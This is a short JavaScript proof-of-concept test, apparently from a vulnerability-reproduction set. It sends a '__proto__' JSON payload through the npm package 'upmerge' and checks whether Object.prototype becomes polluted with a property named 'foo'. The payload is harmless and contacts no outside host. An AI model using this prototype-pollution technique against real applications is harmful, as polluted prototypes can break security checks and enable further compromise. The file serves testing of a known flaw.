const assert = require('assert');

// require vulnerable code
let upmerge = require('upmerge'); // this version is vulnerable
let payload = '{"__proto__":{ "foo" : 23 } }'; // this comes from network

// payload that exercises the vuln.
upmerge.merge({}, JSON.parse(payload));

// testing oracle
try {
    foo;
    assert(true);
    console.log("Payload succeeded");
} catch(e) {
    console.log(e);
    assert(false);
}   

